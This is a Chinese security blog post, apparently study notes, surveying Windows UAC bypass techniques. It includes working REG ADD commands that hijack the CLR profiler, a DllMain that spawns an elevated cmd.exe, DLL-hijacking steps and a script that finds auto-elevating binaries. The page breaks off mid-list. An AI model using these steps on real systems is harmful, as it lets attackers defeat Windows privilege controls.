@@ -1,0 +1,651 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="永安寺">
+  <meta name="keywords" content="">
+  
+  <title>bypassUAC总结 - Victory</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"txluck.github.io","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"NnQfFjLx8ctoF1RbDVgWqADt-gzGzoHsz","app_key":"0Lsfi2upctErQTQC8xHAMnIs","server_url":"https://nnqffjlx.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Victory's Note</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="bypassUAC总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      永安寺
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-18 09:06" pubdate>
+        2022年3月18日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      51
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">bypassUAC总结</h1>
+            
+            <div class="markdown-body">
+              <h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><p>用户帐户控制（User Account Control，简写作UAC)是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">微软</a>公司在其[Windows Vista](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。<br>管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318092800610.png" srcset="/img/loading.gif" lazyload alt="image-20220318092800610"></p>
+<p>点击“是”，管理员就会提升到高权限再去运行该任务。</p>
+<p>而在这些程序里面，有的需要授权、有的不需要，是因为UAC是分授权等级的</p>
+<p>首先请按Win+R，输入gpedit.msc，打开组策略。</p>
+<p>然后我们在左侧窗口找到“计算机配置–Windows设置–安全设置–本地策略–安全选项”，再在右侧窗口找到“用户帐户控制：管理员批准模式中管理员的提升权限提示的行为”，双击该条目，打开设置窗口，如下图：</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093018017.png" srcset="/img/loading.gif" lazyload alt="image-20220318093018017"></p>
+<ul>
+<li>不提示直接提升：关闭UAC，需要权限时直接提升权限。</li>
+<li>在安全桌面上提示凭据：需要权限时在安全桌面上输入管理员密码提升权限。</li>
+<li>在安全桌面上同意提示：需要权限时在安全桌面上选择“允许”提升权限。</li>
+<li>提示凭据：需要权限时在普通窗口中输入管理员密码提升权限。</li>
+<li>同意提示：需要权限时在普通窗口中选择“允许”提升权限。</li>
+<li>非 Windows 二进制文件的同意提示：(默认设置)当非 Microsoft 应用程序的某个操作需要提升权限时，选择“允许”提升权限。</li>
+</ul>
+<p>因为普通应用执行权限有限，某些操作必然会要求更高的管理员权限。此时，通常就需要一个权限提升的操作。程序可以向系统请求提权，系统会将此请求通过提一个提示框，请用户确认。</p>
+<p>如果当前用户的用户组权限不是管理员，提权操作是要求输入管理员密码的，这点和在Linux中的相应操作类似。</p>
+<p>•程序只能在运行前要求提权。如果已经在运行了，那么将失去申请提权的能力•权限提升仅对此次进程有效</p>
+<p>提升权限的操作大致有两个：</p>
+<p>•自动提权请求•手动提权请求</p>
+<p>手动提权就是“以管理员身份运行”，自动提权请求就是程序本身就一运行就开始申请权限，如：注册表编辑器</p>
+<p>在开发的过程中，程序员若要开发一个程序，可以在编译器配置，写入一个配置文件，用于向系统标识该应用程序是必须要管理员权限运行的。</p>
+<p><strong>visual studio里面的uac</strong></p>
+<p>在visual studio里面有一个manifest文件，这个文件本质上是一个xml文件，用于标识当前应用程序的配置属性。其中这几个级别明细如下</p>
+<blockquote>
+<p>•aslnvoker 默认权限</p>
+<p>•highestAvailable 最高权限</p>
+<p>•requireAdministrator 必须是管理员权限</p>
+</blockquote>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093153499.png" srcset="/img/loading.gif" lazyload alt="image-20220318093153499"></p>
+<p>将编译选项调整为requireAdministrator，则当用户运行程序后，将获得管理员权限会话,不需要绕过UAC。</p>
+<h2 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h2><h3 id="autoElevate"><a href="#autoElevate" class="headerlink" title="autoElevate"></a>autoElevate</h3><p>当某个EXE文件的文件清单里有<autoElevate> 元素时，当执行该文件时会默认提权执行。<br>我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。<br>适用范围:管理员权限以获得，要得到高权限管理员权限</autoElevate></p>
+<p>一般用工具sigcheck检测</p>
+<p>网上常拿C:/Windows/SysWOW64/SystemPropertiesAdvanced.exe 举列子</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093759628.png" srcset="/img/loading.gif" lazyload alt="image-20220318093759628"></p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318093806737.png" srcset="/img/loading.gif" lazyload alt="image-20220318093806737"></p>
+<h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><p>参考:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p>
+<p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p>
+<ul>
+<li><p>程序所在目录</p>
+</li>
+<li><p>系统目录即<code>SYSTEM32</code>目录</p>
+</li>
+<li><p>16位系统目录即<code>SYSTEM</code>目录</p>
+</li>
+<li><p><code>Windows</code>目录</p>
+</li>
+<li><p>程序加载目录(<code>SetCurrentDirecctory</code>)</p>
+</li>
+<li><p><code>PATH</code>环境变量中列出的目录</p>
+<p>同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Session Manager/KnownDLLS处可以看见这些dll</p>
+</li>
+</ul>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094048901.png" srcset="/img/loading.gif" lazyload alt="image-20220318094048901"></p>
+<p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p>
+<p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p>
+<p>（1） DLL替换：用恶意的DLL替换掉合法的DLL<br>（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。<br>（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL<br>（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。<br>（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的合法DLL替换为恶意DLL。此方法通常也被称为DLL侧加载<br>（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p>
+<p>实验一：</p>
+<p>这里我们先用第一种方法来进行实验，实验对象是C:/Windows/SysWOW64/SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094345887.png" srcset="/img/loading.gif" lazyload alt="image-20220318094345887"></p>
+<p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094411497.png" srcset="/img/loading.gif" lazyload alt="image-20220318094411497"></p>
+<p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p>
+<p>实验2：</p>
+<p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p>
+<p>我们process monitor设置过滤如下</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094517196.png" srcset="/img/loading.gif" lazyload alt="image-20220318094517196"></p>
+<p>cmd运行 mmc eventvwr.msc,查看调用</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094527395.png" srcset="/img/loading.gif" lazyload alt="image-20220318094527395"></p>
+<p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p>
+<p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p>
+<h2 id="CLR加载任意DLL"><a href="#CLR加载任意DLL" class="headerlink" title="CLR加载任意DLL"></a>CLR加载任意DLL</h2><p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p>
+<p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">COR_ENABLE_PROFILING</span> = <span class="hljs-number">1</span><br><br><span class="hljs-attr">COR_PROFILER</span>=&#123;CLSIDor ProgID&#125;<br></code></pre></td></tr></table></figure>
+
+<p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。<br>在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载<br>net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。<br>总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p>
+<p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。<br>以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”) 那么就会蹦出来高权限cmd窗口</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">REG ADD <span class="hljs-string">&quot;HKCU/Software/Classes/CLSID/&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;/InprocServer32&quot;</span> <span class="hljs-string">/ve</span> <span class="hljs-string">/t</span> REG_EXPAND_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;C:/test/calc.dll&quot;</span> <span class="hljs-string">/f</span><br>REG ADD <span class="hljs-string">&quot;HKCU/Environment&quot;</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;COR_PROFILER&quot;</span> <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot;</span> <span class="hljs-string">/f</span><br>REG ADD <span class="hljs-string">&quot;HKCU/Environment&quot;</span> <span class="hljs-string">/v</span> <span class="hljs-string">&quot;COR_ENABLE_PROFILING&quot;</span> <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/d</span> <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-string">/f</span><br>mmc gpedit.msc<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-built_in">BOOL</span> WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)<br>&#123;<br>    <span class="hljs-keyword">char</span> cmd[] = <span class="hljs-string">&quot;cmd.exe&quot;</span>;<br><br>    <span class="hljs-keyword">switch</span> (fdwReason)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(cmd, SW_SHOWNORMAL);<br>        ExitProcess(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>另外的，你还可以为COR_PROFILER_PATH设置为如//server/share/test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.const27.com/2021/06/28/Bypass%20UAC/">https://www.const27.com/2021/06/28/Bypass%20UAC/</a></p>
+<h3 id="白名单程序"><a href="#白名单程序" class="headerlink" title="白名单程序"></a>白名单程序</h3><h3 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h3><p>这个方法很简单。打开C:/Windows/system32/odbcad32.exe，然后通过以下方法打开powershell或者cmd</p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094702785.png" srcset="/img/loading.gif" lazyload alt="image-20220318094702785"></p>
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094743675.png" srcset="/img/loading.gif" lazyload alt="image-20220318094743675"></p>
+<p>成功bypass</p>
+<h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p>
+<p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell 以此内推，还有很多相似的管理工具可以这样利用</p>
+<h3 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h3><p>有一些系统程序是会直接获取管理员权限同时不弹出UAC弹窗，这类程序被称为白名单程序。这些程序拥有autoElevate属性的值为True，会在启动时就静默提升权限。</p>
+<p>那么我们要寻找的uac程序需要符合以下几个要求：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 程序的manifest标识的配置属性 autoElevate 为true<br><span class="hljs-bullet">2.</span> 程序不弹出UAC弹窗<br><span class="hljs-bullet">3.</span> 从注册表里查询Shell/Open/command键值对<br></code></pre></td></tr></table></figure>
+
+<p>首先是寻找autoElevate为true的程序，这里就写一个py脚本去批量跑一下，这里就找system32目录下面的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <br><span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> * <br> <br>path = <span class="hljs-string">&#x27;c:/windows/system32&#x27;</span> <br>files = os.listdir(path) <br><span class="hljs-built_in">print</span>(files) <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GetFileList</span>(<span class="hljs-params">path, fileList</span>):</span> <br>    newDir = path <br>    <span class="hljs-keyword">if</span> os.path.isfile(path): <br>        <span class="hljs-keyword">if</span> path[-<span class="hljs-number">4</span>:] == <span class="hljs-string">&#x27;.exe&#x27;</span>: <br>            fileList.append(path) <br>    <span class="hljs-keyword">elif</span> os.path.isdir(path): <br>        <span class="hljs-keyword">try</span>: <br>            <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> os.listdir(path): <br>                newDir=os.path.join(path,s) <br>                GetFileList(newDir, fileList) <br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e: <br>            <span class="hljs-keyword">pass</span> <br>    <span class="hljs-keyword">return</span> fileList <br>files = GetFileList(path, []) <br><span class="hljs-built_in">print</span>(files) <br><br><span class="hljs-keyword">for</span> eachFile <span class="hljs-keyword">in</span> files: <br>    <span class="hljs-keyword">if</span> eachFile[-<span class="hljs-number">4</span>:] == <span class="hljs-string">&#x27;.exe&#x27;</span>: <br>        command = <span class="hljs-string">r&#x27;./sigcheck64.exe -m &#123;&#125; | findstr auto&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile) <br>        <span class="hljs-built_in">print</span>(command) <br>        p1 = Popen(command, shell=<span class="hljs-literal">True</span>, stdin=PIPE, stdout=PIPE) <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> <span class="hljs-keyword">in</span> p1.stdout.read().decode(<span class="hljs-string">&#x27;gb2312&#x27;</span>): <br>            copy_command = <span class="hljs-string">r&#x27;copy &#123;&#125; ./success&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile) <br>            Popen(copy_command, shell=<span class="hljs-literal">True</span>, stdin=PIPE, stdout=PIPE) <br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile)) <br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;success.txt&#x27;</span>, <span class="hljs-string">&#x27;at&#x27;</span>) <span class="hljs-keyword">as</span> f: <br>                f.writelines(<span class="hljs-string">&#x27;&#123;&#125;/n&#x27;</span>.<span class="hljs-built_in">format</span>(eachFile))<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/18/bypassUAC%E6%80%BB%E7%BB%93/image-20220318094904962.png" srcset="/img/loading.gif" lazyload alt="image-20220318094904962"></p>
+<p>整理之后exe如下所示</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs awk">c:<span class="hljs-regexp">/windows/</span>system32/bthudtask.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/changepk.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/ComputerDefaults.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/dccw.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/dcomcnfg.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/DeviceEject.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/DeviceProperties.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/djoin.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/easinvoker.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/EASPolicyManagerBrokerHost.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/eudcedit.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/eventvwr.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/fodhelper.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/fsquirt.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/FXSUNATD.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/immersivetpmvscmgrsvr.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/iscsicli.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/iscsicpl.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/lpksetup.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/MSchedExe.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/msconfig.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/msra.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/MultiDigiMon.exe <br>c:<span class="hljs-regexp">/windows/</span>system32/newdev.exe <br>c:<span 